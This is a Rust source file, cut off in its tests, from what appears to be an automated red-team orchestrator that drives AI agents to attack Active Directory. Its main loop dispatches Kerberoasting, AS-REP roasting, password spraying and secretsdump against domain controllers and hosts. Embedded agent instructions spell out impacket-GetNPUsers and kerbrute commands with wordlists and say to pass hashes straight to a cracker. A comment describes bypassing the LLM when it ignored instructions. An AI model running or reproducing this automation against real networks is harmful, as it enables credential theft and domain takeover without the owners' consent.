//! auto_credential_access -- kerberoast, AS-REP roast, password spray.

use std::sync::Arc;
use std::time::Duration;

use serde_json::{json, Value};
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Build kerberoast dedup key from domain and username.
fn kerberoast_dedup_key(domain: &str, username: &str) -> String {
    format!("krb:{}:{}", domain.to_lowercase(), username.to_lowercase())
}

/// Build username spray dedup key from domain and username.
fn spray_dedup_key(domain: &str, username: &str) -> String {
    format!("{}:{}", domain.to_lowercase(), username.to_lowercase())
}

/// Build common password spray dedup key.
fn common_spray_dedup_key(domain: &str) -> String {
    format!("common:{}", domain.to_lowercase())
}

/// Build low-hanging fruit dedup key.
fn low_hanging_dedup_key(domain: &str, username: &str) -> String {
    format!("{}:{}", domain.to_lowercase(), username.to_lowercase())
}

/// Build secretsdump dedup key for credential-based dumps.
fn credential_secretsdump_dedup_key(ip: &str, domain: &str, username: &str) -> String {
    format!(
        "{}:{}:{}",
        ip,
        domain.to_lowercase(),
        username.to_lowercase()
    )
}

/// Resolve host domain from hostname FQDN (e.g. "dc01.contoso.local" -> "contoso.local").
fn resolve_host_domain_from_fqdn(hostname: &str) -> String {
    hostname
        .to_lowercase()
        .split_once('.')
        .map(|x| x.1)
        .unwrap_or("")
        .to_string()
}

/// Check if a host domain is related to a credential domain (same, child, or parent).
fn is_host_domain_related(host_domain: &str, cred_domain: &str) -> bool {
    if host_domain.is_empty() {
        return false;
    }
    let h = host_domain.to_lowercase();
    let c = cred_domain.to_lowercase();
    h == c || h.ends_with(&format!(".{c}")) || c.ends_with(&format!(".{h}"))
}

/// One unit of AS-REP roast work: `(domain, dc_ip, dedup_key)`. Re-armable on
/// the `:empty`/`:users` transition so a freshly-enumerated foreign-forest
/// userlist triggers a second pass.
pub(crate) type AsrepWorkItem = (String, String, String);

/// Select AS-REP roast work items for this tick.
///
/// Walks `state.domains`, builds a `:empty`/`:users` re-armable dedup key per
/// domain, and picks the first available DC IP (`domain_controllers` map
/// first, then `target_ips[0]`). Skips domains whose dedup key has already
/// been processed.
pub(crate) fn select_asrep_work(state: &StateInner) -> Vec<AsrepWorkItem> {
    state
        .domains
        .iter()
        .filter_map(|domain| {
            let dom_l = domain.to_lowercase();
            let has_users = state.users.iter().any(|u| {
                u.domain.to_lowercase() == dom_l
                    && !u.username.is_empty()
                    && !u.username.ends_with('$')
            });
            let dedup_key = format!("{}:{}", dom_l, if has_users { "users" } else { "empty" });
            if state.is_processed(DEDUP_ASREP_DOMAINS, &dedup_key) {
                return None;
            }
            let dc_ip = state
                .domain_controllers
                .get(domain)
                .cloned()
                .or_else(|| state.target_ips.first().cloned())?;
            Some((domain.clone(), dc_ip, dedup_key))
        })
        .collect()
}

/// Collect real-principal usernames (no machine accounts, no empty) for a
/// domain, sorted and deduped. Drives the `known_users` arg of an AS-REP
/// dispatch so the agent can run `GetNPUsers -usersfile <list>` directly.
pub(crate) fn collect_known_users_for_domain(state: &StateInner, domain: &str) -> Vec<String> {
    let dom_l = domain.to_lowercase();
    let mut users: Vec<String> = state
        .users
        .iter()
        .filter(|u| u.domain.to_lowercase() == dom_l)
        .filter(|u| !u.username.is_empty() && !u.username.ends_with('$'))
        .map(|u| u.username.clone())
        .collect();
    users.sort();
    users.dedup();
    users
}

/// Build the AS-REP roast dispatch payload. Pure — no Redis, no dispatcher.
///
/// Two branches:
/// - `known_users` non-empty: emit the userlist and a "run GetNPUsers with this
///   list" instruction.
/// - `known_users` empty: emit the cold-start enumeration plan (seclists
///   wordlists + kerbrute fallback).
pub(crate) fn build_asrep_payload(
    domain: &str,
    dc_ip: &str,
    excluded_users: &[String],
    known_users: &[String],
) -> Value {
    let mut payload = json!({
        "techniques": ["kerberos_user_enum_noauth", "asrep_roast", "username_as_password"],
        "target_ip": dc_ip,
        "domain": domain,
        "excluded_users": excluded_users.join(","),
    });
    if !known_users.is_empty() {
        payload["known_users"] = json!(known_users);
        payload["instructions"] = json!(format!(
            "{} usernames already discovered for {}. Run \
             `impacket-GetNPUsers -no-pass -dc-ip {} {}/ -usersfile <(echo \
             \"$known_users\")` and harvest any $krb5asrep$ hashes; \
             prioritise this over `kerberos_user_enum_noauth` (some \
             DCs deny anonymous SAMR). Hand any roastable hash to the \
             cracker tool immediately.",
            known_users.len(),
            domain,
            dc_ip,
            domain,
        ));
    } else {
        payload["instructions"] = json!(format!(
            "No usernames discovered yet for {dom}. Cold-start AS-REP \
             enumeration plan: \
             (1) `impacket-GetNPUsers -no-pass -dc-ip {ip} {dom}/ \
             -usersfile /usr/share/seclists/Usernames/Names/names.txt \
             -format hashcat` (zero-cred; returns $krb5asrep$ for any \
             preauth-disabled account). \
             (2) If step 1 returns no hashes, also try \
             `/usr/share/seclists/Usernames/top-usernames-shortlist.txt` \
             and `/usr/share/seclists/Usernames/cirt-default-usernames.txt`. \
             (3) For username enumeration via Kerberos error codes \
             (KDC_ERR_C_PRINCIPAL_UNKNOWN vs KDC_ERR_PREAUTH_REQUIRED), \
             run `kerbrute userenum --dc {ip} -d {dom} \
             /usr/share/seclists/Usernames/Names/names.txt` if \
             available. \
             (4) Hand every $krb5asrep$ hash to the cracker tool \
             immediately — even one cracked AS-REP hash unlocks an \
             authenticated foothold in {dom}. \
             Do NOT fall back to anonymous SAMR if it returns \
             ACCESS_DENIED; that path is dead on hardened DCs.",
            dom = domain,
            ip = dc_ip,
        ));
    }
    payload
}

/// `(dedup_key, dc_ip, resolved_domain, credential)` — the work item shape
/// the kerberoast dispatch loop consumes.
pub(crate) type KerberoastWorkItem = (String, String, String, ares_core::models::Credential);

/// Resolve a DC IP for a Kerberoast attempt against `cred_domain`. Tries
/// exact match in `domain_controllers`, then child-domain DCs (`d.ends_with(".{cred_domain}")`),
/// then the first `target_ips` entry. Returns `(dc_ip, resolved_domain)` —
/// `resolved_domain` is the child FQDN when the fallback fires, otherwise
/// `cred_domain` itself.
pub(crate) fn resolve_kerberoast_dc(
    state: &StateInner,
    cred_domain: &str,
) -> Option<(String, String)> {
    if let Some(dc_ip) = state.resolve_dc_ip(cred_domain) {
        return Some((dc_ip, cred_domain.to_string()));
    }
    let suffix = format!(".{cred_domain}");
    for (domain, dc_ip) in &state.all_domains_with_dcs() {
        if domain.ends_with(&suffix) {
            return Some((dc_ip.clone(), domain.clone()));
        }
    }
    state
        .target_ips
        .first()
        .cloned()
        .map(|ip| (ip, cred_domain.to_string()))
}

/// Select Kerberoast work items for this tick. Filters credentials by
/// delegation/quarantine gates, caps at `max_items`.
pub(crate) fn select_kerberoast_work(
    state: &StateInner,
    max_items: usize,
) -> Vec<KerberoastWorkItem> {
    state
        .credentials
        .iter()
        .filter(|c| !c.domain.is_empty())
        .filter(|c| !state.is_delegation_account(&c.username))
        .filter(|c| !state.is_principal_quarantined(&c.username, &c.domain))
        .filter_map(|cred| {
            let cred_domain = cred.domain.to_lowercase();
            let dedup = kerberoast_dedup_key(&cred_domain, &cred.username);
            if state.is_processed(DEDUP_CRACK_REQUESTS, &dedup) {
                return None;
            }
            let (dc_ip, resolved_domain) = resolve_kerberoast_dc(state, &cred_domain)?;
            Some((dedup, dc_ip, resolved_domain, cred.clone()))
        })
        .take(max_items)
        .collect()
}

/// Username-spray work item: `(dedup_key, dc_ip, domain)`. One per unique
/// `(domain, username)` — the spray loop batches them by domain.
pub(crate) type SprayWorkItem = (String, String, String);

/// Select username-as-password spray work items. Walks `state.users`,
/// skipping built-in disabled accounts, delegation accounts, and quarantined
/// principals; falls back to child-domain DCs when an exact match is missing.
pub(crate) fn select_username_spray_work(
    state: &StateInner,
    max_items: usize,
) -> Vec<SprayWorkItem> {
    state
        .users
        .iter()
        .filter(|u| !u.domain.is_empty())
        .filter(|u| !ares_core::models::is_always_disabled_account(&u.username))
        .filter(|u| !state.is_delegation_account(&u.username))
        .filter(|u| !state.is_principal_quarantined(&u.username, &u.domain))
        .filter_map(|u| {
            let user_domain = u.domain.to_lowercase();
            let dedup = spray_dedup_key(&user_domain, &u.username);
            if state.is_processed(DEDUP_USERNAME_SPRAY, &dedup) {
                return None;
            }
            let dc_ip = state
                .domain_controllers
                .get(&user_domain)
                .cloned()
                .or_else(|| {
                    let suffix = format!(".{user_domain}");
                    state
                        .domain_controllers
                        .iter()
                        .find(|(d, _)| d.ends_with(&suffix))
                        .map(|(_, ip)| ip.clone())
                })?;
            Some((dedup, dc_ip, u.domain.clone()))
        })
        .take(max_items)
        .collect()
}

/// Low-hanging-fruit work item: `(dedup_key, dc_ip, credential)`.
pub(crate) type LowHangingWorkItem = (String, String, ares_core::models::Credential);

/// Select credentials to test against high-success-rate AD discovery
/// techniques (LAPS read, gMSA read, etc.). Falls back to child-domain DC,
/// then `target_ips[0]` when no DC mapping exists.
pub(crate) fn select_low_hanging_work(
    state: &StateInner,
    max_items: usize,
) -> Vec<LowHangingWorkItem> {
    state
        .credentials
        .iter()
        .filter(|c| !c.domain.is_empty() && !c.password.is_empty())
        .filter(|c| c.is_admin || !state.is_delegation_account(&c.username))
        .filter(|c| !state.is_principal_quarantined(&c.username, &c.domain))
        .filter_map(|cred| {
            let cred_domain = cred.domain.to_lowercase();
            if state.is_domain_dominated(&cred_domain) {
                return None;
            }
            let dedup = low_hanging_dedup_key(&cred_domain, &cred.username);
            if state.is_processed(DEDUP_LOW_HANGING, &dedup) {
                return None;
            }
            let dc_ip = state
                .domain_controllers
                .get(&cred_domain)
                .cloned()
                .or_else(|| {
                    let suffix = format!(".{cred_domain}");
                    state
                        .domain_controllers
                        .iter()
                        .find(|(d, _)| d.ends_with(&suffix))
                        .map(|(_, ip)| ip.clone())
                })
                .or_else(|| state.target_ips.first().cloned())?;
            Some((dedup, dc_ip, cred.clone()))
        })
        .take(max_items)
        .collect()
}

/// Per-credential secretsdump work item: `(dedup_key, host_ip, credential)`.
pub(crate) type SdWorkItem = (String, String, ares_core::models::Credential);

/// Select cross-host secretsdump work items. Walks every (credential, host)
/// pair, keeping only domain-related host/cred combinations; skips quarantine
/// and delegation; caps at `max_items`.
pub(crate) fn select_credential_secretsdump_work(
    state: &StateInner,
    max_items: usize,
) -> Vec<SdWorkItem> {
    let mut items = Vec::new();
    for cred in state
        .credentials
        .iter()
        .filter(|c| !c.domain.is_empty() && !c.password.is_empty())
        .filter(|c| c.is_admin || !state.is_delegation_account(&c.username))
        .filter(|c| !state.is_principal_quarantined(&c.username, &c.domain))
    {
        let cred_domain = cred.domain.to_lowercase();
        for host in &state.hosts {
            let host_domain = {
                let from_hostname = resolve_host_domain_from_fqdn(&host.hostname);
                if from_hostname.is_empty() {
                    state
                        .domain_controllers
                        .iter()
                        .find(|(_, ip)| ip.as_str() == host.ip)
                        .map(|(d, _)| d.to_lowercase())
                        .unwrap_or_default()
                } else {
                    from_hostname
                }
            };
            if !is_host_domain_related(&host_domain, &cred_domain) {
                continue;
            }
            let dedup = credential_secretsdump_dedup_key(&host.ip, &cred_domain, &cred.username);
            if !state.is_processed(DEDUP_SECRETSDUMP, &dedup) {
                items.push((dedup, host.ip.clone(), cred.clone()));
            }
        }
    }
    items.into_iter().take(max_items).collect()
}

/// True when state shows the common-password-spray prerequisites for `domain`
/// are met: AS-REP enumeration has fired (re-armable `:empty` or `:users`
/// key), delegation enumeration has dispatched at least once, and no
/// uncracked Kerberoast hashes remain for this domain.
///
/// Extracted from the inline `.filter()` chain so the prerequisite gates
/// can be tested independently of the outer dispatcher loop.
pub(crate) fn common_spray_prereqs_met(state: &StateInner, domain: &str) -> bool {
    let d = domain.to_lowercase();
    let empty_key = format!("{d}:empty");
    let users_key = format!("{d}:users");
    let asrep_done = state.is_processed(DEDUP_ASREP_DOMAINS, &empty_key)
        || state.is_processed(DEDUP_ASREP_DOMAINS, &users_key);
    if !asrep_done {
        return false;
    }
    let delegation_prefix = format!("{}:", d);
    if !state.has_processed_prefix(DEDUP_DELEGATION_CREDS, &delegation_prefix) {
        return false;
    }
    let has_uncracked_kerberoast = state.hashes.iter().any(|h| {
        h.hash_type.to_lowercase().contains("kerberoast")
            && h.domain.to_lowercase() == d
            && h.cracked_password.is_none()
    });
    !has_uncracked_kerberoast
}

/// Select common-password-spray work items: one `(domain, dc_ip)` per known
/// DC whose dedup key is unprocessed and whose AS-REP / delegation
/// prerequisites are satisfied.
pub(crate) fn select_common_spray_work(state: &StateInner) -> Vec<(String, String)> {
    state
        .domain_controllers
        .iter()
        .filter(|(domain, _)| {
            let key = common_spray_dedup_key(domain);
            !state.is_processed(DEDUP_PASSWORD_SPRAY, &key)
        })
        .filter(|(domain, _)| common_spray_prereqs_met(state, domain))
        .map(|(domain, dc_ip)| (domain.clone(), dc_ip.clone()))
        .collect()
}

/// Build the username-as-password spray payload.
pub(crate) fn build_username_spray_payload(
    dc_ip: &str,
    domain: &str,
    excluded_users: &[String],
) -> Value {
    json!({
        "technique": "username_as_password",
        "target_ip": dc_ip,
        "domain": domain,
        "excluded_users": excluded_users.join(","),
    })
}

/// Build the "common password" spray payload (uses a seclists wordlist).
pub(crate) fn build_common_spray_payload(
    dc_ip: &str,
    domain: &str,
    excluded_users: &[String],
) -> Value {
    json!({
        "techniques": ["password_spray", "username_as_password"],
        "reason": "low_hanging_fruit",
        "target_ip": dc_ip,
        "domain": domain,
        "use_common_passwords": true,
        "acknowledge_no_policy": true,
        "excluded_users": excluded_users.join(","),
    })
}

/// Complex credential access automation: kerberoast, AS-REP roast, password spray.
/// Interval: 15s + Notify wake.
pub async fn auto_credential_access(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let notify = dispatcher.credential_access_notify.clone();
    let mut interval = tokio::time::interval(Duration::from_secs(15));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = notify.notified() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        // Re-armable dedup. The cold-start AS-REP dispatch fires before
        // cross-forest LDAP enum has populated `state.users` for foreign
        // forests — at that point known_users is empty and the dispatch
        // uses the generic wordlist. Later, after the inter-realm ticket
        // lands and LDAP-via-ticket enumerates the foreign forest's
        // accounts in a SID-filtered cross-forest target, we MUST
        // re-dispatch with known_users populated; otherwise the
        // discovered usernames never get consumed by AS-REP. Key the
        // dedup on `domain:has_users` so the "empty" and "non-empty"
        // states are tracked independently — at most two dispatches per
        // domain across the operation lifetime.
        let asrep_work: Vec<AsrepWorkItem> = if !dispatcher.is_technique_allowed("asrep_roast") {
            Vec::new()
        } else {
            let state = dispatcher.state.read().await;
            select_asrep_work(&state)
        };

        for (domain, dc_ip, dedup_key) in asrep_work {
            let (excluded_users, known_users) = {
                let state = dispatcher.state.read().await;
                let excluded = state.quarantined_principals_in_domain(&domain);
                let users = collect_known_users_for_domain(&state, &domain);
                (excluded, users)
            };
            let payload = build_asrep_payload(&domain, &dc_ip, &excluded_users, &known_users);

            // Mark dedup BEFORE either dispatch fires. The deterministic
            // path below is fire-and-forget; if we deferred marking until
            // after a successful LLM submit, a deferred/errored LLM submit
            // would leave the deterministic spawn unguarded — next 15s tick
            // would queue another background asrep_roast against the same
            // userlist. Mark first, dispatch second.
            dispatcher
                .state
                .write()
                .await
                .mark_processed(DEDUP_ASREP_DOMAINS, dedup_key.clone());
            let _ = dispatcher
                .state
                .persist_dedup(&dispatcher.queue, DEDUP_ASREP_DOMAINS, &dedup_key)
                .await;

            let priority = dispatcher.effective_priority("asrep_roast");
            match dispatcher
                .throttled_submit("credential_access", "credential_access", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        domain = %domain,
                        dedup_key = %dedup_key,
                        known_users = known_users.len(),
                        "AS-REP roast dispatched"
                    );
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch AS-REP roast"),
            }

            // Deterministic AS-REP roast: when we already have a userlist,
            // skip the LLM and call the tool directly. The LLM agent loop
            // in the credential_access role consistently picks
            // `password_spray` and `username_as_password` over
            // `asrep_roast` despite the techniques ordering and explicit
            // instructions — this leaves the most reliable foothold path
            // for SID-filtered foreign forests (AS-REP roast of a preauth-
            // disabled account from the discovered userlist) unexercised.
            // dispatch_tool routes through the worker tool_exec subject and
            // its discoveries flow into state via push_realtime_discoveries.
            // Guarded by the dedup mark above — at most one deterministic
            // dispatch per (domain, has-users) transition.
            if !known_users.is_empty() {
                let det_args = json!({
                    "domain": domain,
                    "dc_ip": dc_ip,
                    "known_users": known_users,
                });
                let det_call = ares_llm::ToolCall {
                    id: format!("asrep_det_{}", uuid::Uuid::new_v4().simple()),
                    name: "asrep_roast".to_string(),
                    arguments: det_args,
                };
                let det_task_id = format!(
                    "asrep_det_{}",
                    &uuid::Uuid::new_v4().simple().to_string()[..12]
                );
                info!(
                    task_id = %det_task_id,
                    domain = %domain,
                    known_users = known_users.len(),
                    "AS-REP roast dispatched (direct tool, no LLM)"
                );
                let dispatcher_bg = dispatcher.clone();
                let domain_bg = domain.clone();
                tokio::spawn(async move {
                    match dispatcher_bg
                        .llm_runner
                        .tool_dispatcher()
                        .dispatch_tool("credential_access", &det_task_id, &det_call)
                        .await
                    {
                        Ok(result) => {
                            let hash_count = result
                                .discoveries
                                .as_ref()
                                .and_then(|d| d.get("hashes"))
                                .and_then(|h| h.as_array())
                                .map(|a| a.len())
                                .unwrap_or(0);
                            info!(
                                task_id = %det_task_id,
                                domain = %domain_bg,
                                hash_count,
                                "Deterministic AS-REP roast completed"
                            );
                        }
                        Err(e) => {
                            warn!(err = %e, domain = %domain_bg, "Deterministic AS-REP roast failed");
                        }
                    }
                });
            }
        }

        let kerberoast_work: Vec<KerberoastWorkItem> =
            if !dispatcher.is_technique_allowed("kerberoast") {
                Vec::new()
            } else {
                let state = dispatcher.state.read().await;
                let max = if dispatcher.config.strategy.is_comprehensive() {
                    10
                } else {
                    2
                };
                select_kerberoast_work(&state, max)
            };

        for (dedup_key, dc_ip, resolved_domain, cred) in kerberoast_work {
            let priority = dispatcher.effective_priority("kerberoast");
            match dispatcher
                .request_credential_access("kerberoast", &dc_ip, &resolved_domain, &cred, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    debug!(task_id = %task_id, domain = %resolved_domain, "Kerberoast dispatched");
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_CRACK_REQUESTS, dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_CRACK_REQUESTS, &dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch kerberoast"),
            }
        }

        let spray_work: Vec<SprayWorkItem> = {
            let state = dispatcher.state.read().await;
            let max = if dispatcher.config.strategy.is_comprehensive() {
                20
            } else {
                5
            };
            select_username_spray_work(&state, max)
        };

        // Submit one spray task per domain (batched)
        let mut sprayed_domains = std::collections::HashSet::new();
        for (_dedup_key, dc_ip, domain) in &spray_work {
            if sprayed_domains.contains(domain) {
                continue;
            }
            sprayed_domains.insert(domain.clone());

            let excluded_users = dispatcher
                .state
                .read()
                .await
                .quarantined_principals_in_domain(domain);
            let payload = build_username_spray_payload(dc_ip, domain, &excluded_users);

            match dispatcher
                .throttled_submit("credential_access", "credential_access", payload, 4)
                .await
            {
                Ok(Some(task_id)) => {
                    debug!(task_id = %task_id, domain = %domain, "Password spray dispatched");
                    // Mark all users in this domain's batch as processed
                    for (dk, _, d) in &spray_work {
                        if d == domain {
                            dispatcher
                                .state
                                .write()
                                .await
                                .mark_processed(DEDUP_USERNAME_SPRAY, dk.clone());
                            let _ = dispatcher
                                .state
                                .persist_dedup(&dispatcher.queue, DEDUP_USERNAME_SPRAY, dk)
                                .await;
                        }
                    }
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch password spray"),
            }
        }

        // Fast credential discovery — dispatch high-success-rate techniques that
        // find hardcoded/stored passwords in Active Directory.
        let low_hanging_work: Vec<LowHangingWorkItem> = {
            let state = dispatcher.state.read().await;
            let max = if dispatcher.config.strategy.is_comprehensive() {
                10
            } else {
                2
            };
            select_low_hanging_work(&state, max)
        };

        for (dedup_key, dc_ip, cred) in low_hanging_work {
            let priority = dispatcher.effective_priority("low_hanging_fruit");
            match dispatcher
                .request_low_hanging_fruit(&dc_ip, &cred.domain, &cred, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        domain = %cred.domain,
                        username = %cred.username,
                        "Low-hanging fruit credential discovery dispatched"
                    );
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_LOW_HANGING, dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_LOW_HANGING, &dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch low-hanging fruit"),
            }
        }

        // Dispatches secretsdump for new credentials against hosts in the same
        // domain (or child/parent domains). Cross-domain attempts generate
        // failed auths that trigger AD account lockout.
        // Credentials may be local admin on member servers — secretsdump fails
        // fast if not, but when it succeeds it's the fastest path to DA.
        let sd_work: Vec<SdWorkItem> = if !dispatcher.is_technique_allowed("secretsdump") {
            Vec::new()
        } else {
            let state = dispatcher.state.read().await;
            if !dispatcher.config.strategy.should_continue_after_da()
                && state.has_domain_admin
                && state.all_forests_dominated()
            {
                Vec::new()
            } else {
                let max = if dispatcher.config.strategy.is_comprehensive() {
                    20
                } else {
                    5
                };
                select_credential_secretsdump_work(&state, max)
            }
        };

        for (dedup_key, target_ip, cred) in sd_work {
            let priority = if cred.is_admin { 2 } else { 7 };
            match dispatcher
                .request_secretsdump(&target_ip, &cred, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        target = %target_ip,
                        username = %cred.username,
                        "Credential secretsdump dispatched"
                    );
                    {
                        let mut state = dispatcher.state.write().await;
                        state.mark_processed(DEDUP_SECRETSDUMP, dedup_key.clone());
                        state.mark_credential_capture_in_flight(&cred.domain);
                    }
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch credential secretsdump"),
            }
        }

        // Keep spraying common passwords until we find admin or achieve DA.
        let common_spray_work: Vec<(String, String)> =
            if !dispatcher.is_technique_allowed("password_spray") {
                Vec::new()
            } else {
                let state = dispatcher.state.read().await;
                if (state.has_domain_admin && state.all_forests_dominated())
                    || state.credentials.iter().any(|c| c.is_admin)
                {
                    Vec::new()
                } else {
                    select_common_spray_work(&state)
                }
            };

        for (domain, dc_ip) in common_spray_work {
            let excluded_users = dispatcher
                .state
                .read()
                .await
                .quarantined_principals_in_domain(&domain);
            let payload = build_common_spray_payload(&dc_ip, &domain, &excluded_users);

            // Mark as processed BEFORE submitting to prevent duplicate deferred entries.
            // The task will be dispatched or deferred regardless.
            let key = common_spray_dedup_key(&domain);
            dispatcher
                .state
                .write()
                .await
                .mark_processed(DEDUP_PASSWORD_SPRAY, key.clone());
            let _ = dispatcher
                .state
                .persist_dedup(&dispatcher.queue, DEDUP_PASSWORD_SPRAY, &key)
                .await;

            let priority = dispatcher.effective_priority("password_spray");
            match dispatcher
                .throttled_submit("credential_access", "credential_access", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(task_id = %task_id, domain = %domain, "Common password spray dispatched");
                }
                Ok(None) => {
                    debug!(domain = %domain, "Common password spray deferred");
                }
                Err(e) => warn!(err = %e, "Failed to dispatch common password spray"),
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // --- kerberoast_dedup_key ---

    #[test]
    fn kerberoast_dedup_key_basic() {
        assert_eq!(
            kerberoast_dedup_key("CONTOSO.LOCAL", "Administrator"),
            "krb:contoso.local:administrator"
        );
    }

    #[test]
    fn kerberoast_dedup_key_already_lowercase() {
        assert_eq!(
            kerberoast_dedup_key("corp.net", "svc_sql"),
            "krb:corp.net:svc_sql"
        );
    }

    #[test]
    fn kerberoast_dedup_key_empty_inputs() {
        assert_eq!(kerberoast_dedup_key("", ""), "krb::");
    }

    // --- spray_dedup_key ---

    #[test]
    fn spray_dedup_key_basic() {
        assert_eq!(
            spray_dedup_key("CONTOSO.LOCAL", "jdoe"),
            "contoso.local:jdoe"
        );
    }

    #[test]
    fn spray_dedup_key_mixed_case() {
        assert_eq!(spray_dedup_key("Corp.Net", "Admin"), "corp.net:admin");
    }

    #[test]
    fn spray_dedup_key_empty() {
        assert_eq!(spray_dedup_key("", ""), ":");
    }

    // --- common_spray_dedup_key ---

    #[test]
    fn common_spray_dedup_key_basic() {
        assert_eq!(
            common_spray_dedup_key("CONTOSO.LOCAL"),
            "common:contoso.local"
        );
    }

    #[test]
    fn common_spray_dedup_key_empty() {
        assert_eq!(common_spray_dedup_key(""), "common:");
    }

    // --- low_hanging_dedup_key ---

    #[test]
    fn low_hanging_dedup_key_basic() {
        assert_eq!(
            low_hanging_dedup_key("CONTOSO.LOCAL", "Admin"),
            "contoso.local:admin"
        );
    }

    #[test]
    fn low_hanging_dedup_key_empty() {
        assert_eq!(low_hanging_dedup_key("", ""), ":");
    }

    // --- credential_secretsdump_dedup_key ---

    #[test]
    fn credential_secretsdump_dedup_key_basic() {
        assert_eq!(
            credential_secretsdump_dedup_key("192.168.58.1", "CONTOSO.LOCAL", "Admin"),
            "192.168.58.1:contoso.local:admin"
        );
    }

    #[test]
    fn credential_secretsdump_dedup_key_preserves_ip() {
        // IP should not be lowercased (it's already case-insensitive)
        assert_eq!(
            credential_secretsdump_dedup_key("192.168.58.100", "Corp.Net", "SVC"),
            "192.168.58.100:corp.net:svc"
        );
    }

    #[test]
    fn credential_secretsdump_dedup_key_empty() {
        assert_eq!(credential_secretsdump_dedup_key("", "", ""), "::");
    }

    // --- resolve_host_domain_from_fqdn ---

    #[test]
    fn resolve_host_domain_from_fqdn_typical() {
        assert_eq!(
            resolve_host_domain_from_fqdn("dc01.contoso.local"),
            "contoso.local"
        );
    }

    #[test]
    fn resolve_host_domain_from_fqdn_nested() {
        assert_eq!(
            resolve_host_domain_from_fqdn("web01.child.contoso.local"),
            "child.contoso.local"
        );
    }

    #[test]
    fn resolve_host_domain_from_fqdn_case_insensitive() {
        assert_eq!(
            resolve_host_domain_from_fqdn("DC01.CONTOSO.LOCAL"),
            "contoso.local"
        );
    }

    #[test]
    fn resolve_host_domain_from_fqdn_bare_hostname() {
        assert_eq!(resolve_host_domain_from_fqdn("dc01"), "");
    }

    #[test]
    fn resolve_host_domain_from_fqdn_empty() {
        assert_eq!(resolve_host_domain_from_fqdn(""), "");
    }

    // --- is_host_domain_related ---

    #[test]
    fn is_host_domain_related_same_domain() {
        assert!(is_host_domain_related("contoso.local", "contoso.local"));
    }

    #[test]
    fn is_host_domain_related_case_insensitive() {
        assert!(is_host_domain_related("CONTOSO.LOCAL", "contoso.local"));
    }

    #[test]
    fn is_host_domain_related_child_of_cred() {
        assert!(is_host_domain_related(
            "child.contoso.local",
            "contoso.local"
        ));
    }

    #[test]
    fn is_host_domain_related_parent_of_cred() {
        assert!(is_host_domain_related(
            "contoso.local",
            "child.contoso.local"
        ));
    }

    #[test]
    fn is_host_domain_related_unrelated() {
        assert!(!is_host_domain_related("corp.net", "contoso.local"));
    }

    #[test]
    fn is_host_domain_related_empty_host() {
        assert!(!is_host_domain_related("", "contoso.local"));
    }

    #[test]
    fn is_host_domain_related_empty_cred() {
        assert!(!is_host_domain_related("contoso.local", ""));
    }

    #[test]
    fn is_host_domain_related_both_empty() {
        assert!(!is_host_domain_related("", ""));
    }

    // ── helpers for select/build tests ─────────────────────────────────

    fn make_cred(user: &str, password: &str, domain: &str) -> ares_core::models::Credential {
        ares_core::models::Credential {
            id: format!("c-{user}-{domain}"),
            username: user.to_string(),
            password: password.to_string(),
            domain: domain.to_string(),
            source: String::new(),
            discovered_at: None,
            is_admin: false,
            parent_id: None,
            attack_step: 0,
        }
    }

    fn make_admin_cred(user: &str, password: &str, domain: &str) -> ares_core::models::Credential {
        let mut c = make_cred(user, password, domain);
        c.is_admin = true;
        c
    }

    fn make_user(username: &str, domain: &str) -> ares_core::models::User {
        ares_core::models::User {
            username: username.to_string(),
            domain: domain.to_string(),
            description: String::new(),
            is_admin: false,
            source: String::new(),
        }
    }

    fn make_host(hostname: &str, ip: &str) -> ares_core::models::Host {
        ares_core::models::Host {
            ip: ip.to_string(),
            hostname: hostname.to_string(),
            os: String::new(),
            roles: Vec::new(),
            services: Vec::new(),
            is_dc: false,
            owned: false,
        }
    }

    fn make_hash_kerberoast(user: &str, domain: &str, cracked: bool) -> ares_core::models::Hash {
        ares_core::models::Hash {
            id: format!("h-{user}-{domain}"),
            username: user.to_string(),
            hash_value: "$krb5tgs$23$...".into(),
            hash_type: "kerberoast".into(),
            domain: domain.to_string(),
            cracked_password: if cracked { Some("pw".into()) } else { None },
            source: String::new(),
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
            aes_key: None,
            is_previous: false,
            source_host: None,
            is_trust_key: false,
            trust_pair_label: None,
        }
    }

    // --- select_asrep_work ----------------------------------------------

    #[test]
    fn select_asrep_emits_empty_key_when_no_users() {
        let mut s = StateInner::new("op".into());
        s.domains.push("contoso.local".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let work = select_asrep_work(&s);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].0, "contoso.local");
        assert_eq!(work[0].1, "192.168.58.10");
        assert_eq!(work[0].2, "contoso.local:empty");
    }

    #[test]
    fn select_asrep_emits_users_key_when_users_present() {
        let mut s = StateInner::new("op".into());
